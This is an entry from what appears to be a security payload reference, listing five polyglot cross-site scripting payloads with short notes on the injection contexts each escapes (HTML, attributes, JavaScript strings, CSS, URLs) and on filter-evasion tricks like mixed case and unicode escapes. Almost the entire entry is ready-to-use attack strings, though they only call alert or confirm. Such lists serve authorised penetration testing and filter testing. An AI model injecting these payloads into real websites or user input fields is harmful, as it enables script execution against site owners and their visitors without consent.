---
id: "xss-polyglot-payloads"
title: "XSS Payloads - Polyglot XSS Payloads"
type: "payload"
category: "web-application"
subcategory: "xss"
tags: ["xss", "polyglot", "payload"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["xss-techniques"]
updated: "2026-03-30"
---

## Overview

Universal payloads that execute across multiple injection contexts — HTML, attribute, JavaScript, URL

## Payloads

### 0xsobky Ultimate Polyglot

Works in HTML, attribute, JS string, and closes style/title/textarea/script contexts

- **Contexts**: html, attribute, script, css
- **Severity**: high

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!><sVg/<sVg/oNloAd=alert()//>
```

### Brutelogic 2025 Polyglot

Multi-context polyglot with optional chaining and contentEditable autofocus

- **Contexts**: html, attribute, script, url
- **Severity**: high

```html
JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//>
```

### s0md3v Compact Polyglot

Short polyglot — closes script, breaks attributes, unicode bypass

- **Contexts**: html, attribute, script
- **Severity**: high

```html
-->'"/</ sCript><svG x=">" onload=(co\u006efirm)``>
```

### Attribute Context Polyglot

Works in both single and double quoted attribute contexts plus JS

- **Contexts**: attribute, script
- **Severity**: high

```html
" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
```

### Multi-Quote JS Breakout

Breaks out of single, double, and template literal JS strings

- **Contexts**: script
- **Severity**: high

```html
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
```
